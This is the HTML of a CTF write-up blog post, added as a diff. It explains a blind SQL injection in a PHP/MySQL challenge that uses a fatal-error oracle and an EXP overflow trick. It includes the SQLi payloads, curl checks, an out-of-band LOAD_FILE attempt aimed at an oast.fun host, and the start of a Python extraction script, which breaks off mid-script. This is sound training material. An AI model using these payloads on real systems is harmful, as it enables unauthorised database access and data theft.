@@ -1,0 +1,792 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PwnSec CTF 2026 | Youssef Kessentini — Reverse Koat Shell</title><meta name="author" content="Youssef Kessentini"><meta name="copyright" content="Youssef Kessentini"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="PwnSec CTF 26: two easy web solves, a boolean blind SQLi built on a PHP type-confusion crash, and a pickle sandbox escape using OBJ instead of REDUCE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PwnSec CTF 2026">
+<meta property="og:url" content="https://kessentini-youssef.dev/2026/09/16/PwnSec-CTF-2026/">
+<meta property="og:site_name" content="Youssef Kessentini — Reverse Koat Shell">
+<meta property="og:description" content="PwnSec CTF 26: two easy web solves, a boolean blind SQLi built on a PHP type-confusion crash, and a pickle sandbox escape using OBJ instead of REDUCE">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kessentini-youssef.dev/img/pwnsec-cover.png">
+<meta property="article:published_time" content="2026-09-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-09-16T15:50:56.792Z">
+<meta property="article:author" content="Youssef Kessentini">
+<meta property="article:tag" content="Blind SQLi">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Deserialization">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Pickle">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="SQL Injection">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kessentini-youssef.dev/img/pwnsec-cover.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PwnSec CTF 2026",
+  "url": "https://kessentini-youssef.dev/2026/09/16/PwnSec-CTF-2026/",
+  "image": "https://kessentini-youssef.dev/img/pwnsec-cover.png",
+  "datePublished": "2026-09-16T16:00:00.000Z",
+  "dateModified": "2026-09-16T15:50:56.792Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Youssef Kessentini",
+      "url": "https://github.com/0xkoat"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="https://kessentini-youssef.dev/2026/09/16/PwnSec-CTF-2026/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&amp;family=Space+Grotesk:wght@400;600;700&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"Author: Youssef Kessentini","link":"Link: ","source":"Source: Youssef Kessentini — Reverse Koat Shell","info":"Copyright belongs to the author. For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source."}},
+  lightbox: 'medium_zoom',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#9fef00","bgDark":"#1a2a1a","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PwnSec CTF 2026',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="google-site-verification" content="rRa4aufVpnogE8yslZ22DTeTCHohhwetcyBS3-HMHHI" /><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Space+Grotesk:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Youssef Kessentini — Reverse Koat Shell" type="application/atom+xml">
+</head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/avatar.png'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-flag"></i><span> Writeups</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/HTB-Machines/"><i class="fa-fw fas fa-server"></i><span> HTB Machines</span></a></li><li><a class="site-page child" href="/categories/HTB-Challenges/"><i class="fa-fw fas fa-puzzle-piece"></i><span> HTB Challenges</span></a></li><li><a class="site-page child" href="/categories/CTF-Writeups/"><i class="fa-fw fas fa-trophy"></i><span> CTF Writeups</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/Portswigger/"><i class="fa-fw fas fa-bug"></i><span> Portswigger</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Projects/"><i class="fa-fw fas fa-project-diagram"></i><span> Projects</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Events/"><i class="fa-fw fas fa-calendar-alt"></i><span> Events</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-secret"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/pwnsec-cover.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Youssef Kessentini — Reverse Koat Shell</span></a><a class="nav-page-title" href="/"><span class="site-name">PwnSec CTF 2026</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-flag"></i><span> Writeups</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/HTB-Machines/"><i class="fa-fw fas fa-server"></i><span> HTB Machines</span></a></li><li><a class="site-page child" href="/categories/HTB-Challenges/"><i class="fa-fw fas fa-puzzle-piece"></i><span> HTB Challenges</span></a></li><li><a class="site-page child" href="/categories/CTF-Writeups/"><i class="fa-fw fas fa-trophy"></i><span> CTF Writeups</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/Portswigger/"><i class="fa-fw fas fa-bug"></i><span> Portswigger</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Projects/"><i class="fa-fw fas fa-project-diagram"></i><span> Projects</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Events/"><i class="fa-fw fas fa-calendar-alt"></i><span> Events</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-secret"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PwnSec CTF 2026</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-09-16T16:00:00.000Z" title="Created 2026-09-16 17:00:00">2026-09-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-09-16T15:50:56.792Z" title="Updated 2026-09-16 16:50:56">2026-09-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;This writeup is&quot;,&quot;messageNext&quot;:&quot;days old. Some techniques may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2026-09-16 16:50:56&quot;}" hidden></div><p><code>PHP</code> · <code>MySQL</code> · <code>mysqli</code> · <code>Python 3.12</code> · <code>Flask</code> · <code>pickle</code> · <code>pickletools</code> · <code>curl</code> · <code>requests</code> · <code>sqlmap</code></p>
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>PwnSec CTF 26 ran on September 12th under a “Humans vs Cyborgs” banner at <a target="_blank" rel="noopener" href="https://pwnsec.ctf.ae/">pwnsec.ctf.ae</a>. I came out of it with two flags, both from easy web challenges. That’s the whole scoreboard story on my end, and I’d rather write it down than pretend otherwise.</p>
+<p>The two solves were worth writing up anyway, because neither one fell to a standard payload. <strong>Slop Slop Go Away</strong> was a SQL injection where every classic channel was deliberately sealed off and the actual oracle turned out to live in the PHP, not the SQL. <strong>Time Capsule</strong> was a pickle deserialization challenge wrapped in three separate filters, where the way through was an opcode most people forget exists.</p>
+<p>Both writeups below are the full thing, exactly as I worked them.</p>
+<span id="more"></span>
+
+<hr>
+<h1 id="Challenge-1-Slop-Slop-Go-Away"><a href="#Challenge-1-Slop-Slop-Go-Away" class="headerlink" title="Challenge 1: Slop Slop Go Away"></a>Challenge 1: Slop Slop Go Away</h1><blockquote>
+<p><strong>Difficulty</strong>: <span style="color:#9fef00">Easy</span> &nbsp;|&nbsp; <strong>Category</strong>: <span style="color:#9fef00">Web</span></p>
+</blockquote>
+<p>The challenge statement was a nursery rhyme, credited to “Fat Mesh”:</p>
+<blockquote>
+<p>slop slop go away<br>Come again another day<br>Be the person that you fear<br>Slop slop go away</p>
+</blockquote>
+<h2 id="1-The-source-code"><a href="#1-The-source-code" class="headerlink" title="1. The source code"></a>1. The source code</h2><p>Visiting the URL directly dumps the PHP source:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$START</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="title function_ invoke__">register_shutdown_function</span>(function () <span class="keyword">use</span> ($<span class="title">START</span>) &#123;</span><br><span class="line">    $<span class="title">remaining</span> = 2.0 - (<span class="title">microtime</span>(<span class="title">true</span>) - $<span class="title">START</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$remaining</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>((<span class="keyword">int</span>)(<span class="variable">$remaining</span> * <span class="number">1000000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;); <span class="comment">// no timing attack!!</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_report</span>(MYSQLI_REPORT_OFF);</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;chall&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT username FROM users WHERE id = &quot;</span> . <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$res</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ill try to tell him, dw&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_row</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ill try to tell him, dw&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Observations"><a href="#Observations" class="headerlink" title="Observations"></a>Observations</h3><ol>
+<li><strong>Raw SQL injection</strong> on <code>id</code>, with no sanitization and no parameterization.</li>
+<li><strong>A deliberate 2-second floor</strong> via <code>register_shutdown_function</code>. Every response takes at least 2.0s, and the comment <code>// no timing attack!!</code> confirms it’s intentional.</li>
+<li><strong>The output is always the same string.</strong> <code>$row</code> is fetched but never printed, so UNION-based output is useless.</li>
+<li><strong><code>mysqli_report(MYSQLI_REPORT_OFF)</code></strong> hides MySQL errors.</li>
+</ol>
+<h3 id="The-subtle-bug"><a href="#The-subtle-bug" class="headerlink" title="The subtle bug"></a>The subtle bug</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);   <span class="comment">// mysqli_result | TRUE | FALSE</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$res</span>) &#123; <span class="keyword">die</span>(...); &#125;   <span class="comment">// FALSE → die</span></span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_row</span>();  <span class="comment">// TRUE → FATAL ERROR</span></span><br></pre></td></tr></table></figure>
+
+<p><code>mysqli::query()</code> returns <strong>three different types</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>Query type</th>
+<th>Return</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SELECT</code>, <code>SHOW</code>, <code>DESCRIBE</code>, <code>EXPLAIN</code></td>
+<td><code>mysqli_result</code> object</td>
+</tr>
+<tr>
+<td><code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code>, <code>SELECT ... INTO @var</code>, <code>SELECT ... INTO OUTFILE</code></td>
+<td><code>TRUE</code> (boolean)</td>
+</tr>
+<tr>
+<td>Error</td>
+<td><code>FALSE</code></td>
+</tr>
+</tbody></table>
+<p>When it returns <code>TRUE</code>, the next line executes <code>TRUE-&gt;fetch_row()</code>, which is a fatal PHP error:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught Error: Call to a member function fetch_row() on bool</span><br></pre></td></tr></table></figure>
+
+<p><strong>That fatal error changes the response body.</strong> This is our oracle.</p>
+<h2 id="2-The-dead-ends"><a href="#2-The-dead-ends" class="headerlink" title="2. The dead ends"></a>2. The dead ends</h2><p>Before finding the oracle, everything classic fails:</p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Result</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>id=1 OR SLEEP(5)</code></td>
+<td>2.4s</td>
+<td><code>users</code> empty → <code>WHERE</code> not evaluated</td>
+</tr>
+<tr>
+<td><code>id=(SELECT SLEEP(5))</code></td>
+<td>2.4s</td>
+<td>Same reason</td>
+</tr>
+<tr>
+<td><code>id=1 UNION SELECT SLEEP(5)--</code></td>
+<td>2.4s</td>
+<td><code>--</code> needs a trailing space, and column count must match</td>
+</tr>
+<tr>
+<td><code>BENCHMARK(3000000000, MD5(1))</code></td>
+<td>2.4s</td>
+<td>Query never executed</td>
+</tr>
+<tr>
+<td><code>INTO OUTFILE &#39;/var/www/html/x&#39;</code></td>
+<td>404</td>
+<td>No <code>FILE</code> privilege &#x2F; <code>secure_file_priv</code> block</td>
+</tr>
+<tr>
+<td><code>LOAD_FILE(&#39;\\\\...oast.fun\\a&#39;)</code></td>
+<td>No DNS hit</td>
+<td>No <code>FILE</code> privilege</td>
+</tr>
+<tr>
+<td>sqlmap</td>
+<td>30+ min, no hit</td>
+<td>2s shutdown sleep defeats its statistical model</td>
+</tr>
+</tbody></table>
+<p>Everything returned byte-identical output. All timing and out-of-band channels were dead.</p>
+<h2 id="3-The-breakthrough"><a href="#3-The-breakthrough" class="headerlink" title="3. The breakthrough"></a>3. The breakthrough</h2><p>Force <code>query()</code> to return <code>TRUE</code> using <strong><code>SELECT ... INTO @var</code></strong>, a valid MySQL clause that produces no result set but needs no file privileges:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 INTO @x</span><br></pre></td></tr></table></figure>
+
+<p>The full query becomes:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">INTO</span> <span class="variable">@x</span></span><br></pre></td></tr></table></figure>
+
+<p>MySQL accepts this, returns no result set, PHP’s <code>mysqli::query()</code> returns <code>TRUE</code>, and line 14 crashes with a fatal error.</p>
+<p>Verified:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;https://.../?id=1%20INTO%20@x&quot;</span> | grep -o <span class="string">&quot;Fatal error&quot;</span></span><br><span class="line"><span class="comment"># → Fatal error</span></span><br></pre></td></tr></table></figure>
+
+<p>We now have a way to detect “query succeeded without a result set”.</p>
+<h2 id="4-Turning-it-into-a-boolean-oracle"><a href="#4-Turning-it-into-a-boolean-oracle" class="headerlink" title="4. Turning it into a boolean oracle"></a>4. Turning it into a boolean oracle</h2><p>We need to make the crash <strong>conditional</strong>. The naive form:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">AND</span> IF(<span class="operator">&lt;</span><span class="keyword">condition</span><span class="operator">&gt;</span>, <span class="number">1</span>, (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> nonexistent)) <span class="keyword">INTO</span> <span class="variable">@x</span></span><br></pre></td></tr></table></figure>
+
+<p>fails, because <strong>MySQL parses both branches of <code>IF</code> at parse time</strong>. Any invalid table reference in either branch breaks the query before the condition is ever evaluated.</p>
+<p>The fix is to use an error that happens at <strong>runtime</strong>, only in the branch actually taken. The classic primitive is numeric overflow:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">AND</span> IF(<span class="operator">&lt;</span><span class="keyword">condition</span><span class="operator">&gt;</span>, <span class="number">1</span>, <span class="built_in">EXP</span>(<span class="number">99999</span>)) <span class="keyword">INTO</span> <span class="variable">@x</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Condition <strong>TRUE</strong> → <code>IF</code> returns <code>1</code> → query succeeds → <code>query()</code> &#x3D; <code>TRUE</code> → PHP fatally crashes → response contains <code>Fatal error</code>.</li>
+<li>Condition <strong>FALSE</strong> → <code>IF</code> returns <code>EXP(99999)</code> → double overflow error → query fails → <code>$res = FALSE</code> → <code>die(&quot;ill try to tell him, dw&quot;)</code> → normal response.</li>
+</ul>
+<h3 id="The-oracle"><a href="#The-oracle" class="headerlink" title="The oracle"></a>The oracle</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error in response  ⇔  condition is TRUE</span><br></pre></td></tr></table></figure>
+
+<p>Verified end to end:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;.../?id=1%20AND%20IF(1=1,1,EXP(99999))%20INTO%20@x&quot;</span> | grep -c <span class="string">&quot;Fatal error&quot;</span>   <span class="comment"># → 1</span></span><br><span class="line">curl -s <span class="string">&quot;.../?id=1%20AND%20IF(1=2,1,EXP(99999))%20INTO%20@x&quot;</span> | grep -c <span class="string">&quot;Fatal error&quot;</span>   <span class="comment"># → 0</span></span><br></pre></td></tr></table></figure>
+
+<p>One trap worth flagging: <code>UNION ... INTO @x</code> is <strong>invalid MySQL</strong>. <code>INTO</code> can only attach to the last <code>SELECT</code> of the top-level query, never after a <code>UNION</code>. That’s why the union variant returned 0 for both true and false, which cost me a while before I noticed. Always use the <code>AND</code> form.</p>
+<h2 id="5-Extracting-data"><a href="#5-Extracting-data" class="headerlink" title="5. Extracting data"></a>5. Extracting data</h2><p>Two optimizations make extraction practical given the forced 2s delay.</p>
+<p><strong>Binary search instead of linear scan.</strong> Naive scanning tries ASCII 32, 33, 34, and so on, up to 95 requests per character. Splitting 0 to 255 in half each time gets it to roughly 8 requests per character.</p>
+<p><strong><code>GROUP_CONCAT</code> batching.</strong> Instead of one extraction per table name, pull them all in one SQL string:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(table_name SEPARATOR <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">FROM</span> information_schema.tables</span><br><span class="line"><span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;chall&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Same for columns, and rows via <code>CONCAT_WS(&#39;|&#39;, col1, col2, ...)</code>. This collapses dozens of extractions into one.</p>
+<h2 id="6-The-final-Python-script"><a href="#6-The-final-Python-script" class="headerlink" title="6. The final Python script"></a>6. The final Python script</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;https://65d7587f7ad9145d.chal.ctf.ae/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">cond</span>):</span><br><span class="line">    payload = <span class="string">f&quot;1 AND IF(<span class="subst">&#123;cond&#125;</span>,1,EXP(99999)) INTO @x&quot;</span></span><br><span class="line">    r = requests.get(URL, params=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;, timeout=<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Fatal error&quot;</span> <span class="keyword">in</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_len</span>(<span class="params">query</span>):</span><br><span class="line">    lo, hi = <span class="number">0</span>, <span class="number">500</span></span><br><span class="line">    <span 